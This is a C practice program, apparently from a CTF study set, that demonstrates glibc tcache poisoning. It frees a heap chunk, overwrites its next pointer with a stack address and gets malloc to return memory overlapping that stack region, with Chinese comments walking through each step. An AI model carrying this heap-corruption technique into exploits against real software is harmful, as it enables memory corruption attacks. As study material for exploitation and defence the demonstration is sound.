#include <stdio.h>
#include <stdlib.h>
#include <stdint.h>
#include <string.h>

#define RED_BOLD "\x1b[;31;1m"
#define BLU_BOLD "\x1b[;34;1m"
#define YEL_BOLD "\x1b[;33;1m"
#define GRN_BOLD "\x1b[;32;1m"
#define CYAN_BOLD_ITALIC "\x1b[;36;1;3m"
#define RESET "\x1b[0;m"

int main() {
    intptr_t *p1, *p2, *p3;
    size_t target[10];
    printf("Our target is a stack region at "YEL_BOLD"%p\n", (void *)target);
    p1 = malloc(0x30);
    memset(p1, 0x41, 0x30+8);
    fprintf(stderr, RESET"Allocated victim chunk(0x30) at "BLU_BOLD"%p\n", p1);

    fprintf(stderr, RESET"Freed victim chunk to put it in a tcache bin\n");
    free(p1);
    fprintf(stderr, "Emulating corruption of the next ptr\n");
    *p1 = (int64_t)target;

    fprintf(stderr, "Now we make two requests for the appropriate size so that malloc returns a chunk overlapping our target\n");
    p2 = malloc(0x30);
    memset(p2, 0x42, 0x30+8);
    p3 = malloc(0x30);
    memset(p3, 0x42, 0x30+8);
    fprintf(stderr, "The first malloc(0x30) returned "BLU_BOLD"%p"RESET", the second one: "YEL_BOLD"%p"RESET"\n", p2, p3);
}

/*
	tcache_poison practice
	environ: Ubuntu 17.10 / glibc 2.26
	origin: https://firmianay.gitbooks.io/ctf-all-in-one/content/doc/4.14_glibc_tcache.html
	流程:
		1. 先 malloc p1
		2. 之後 free(p1) ，這時 count = 1
		3. 雖然 p1 free 掉了，但我們再對 p1 設值，來改 next pointer 為我們的 target
		   所以現在 tcache_entry 內部是先指向 p1 -> target
		4. 現在 malloc 會取得剛剛 free 的 p1 ，這時 count = 0
		5. 這時再一次 malloc 就可以取得 target 的位置，因為 count 也沒有檢查，這時變成 0xff
		   (這邊也可以有其他思路做類似 unsorted bin attack)
*/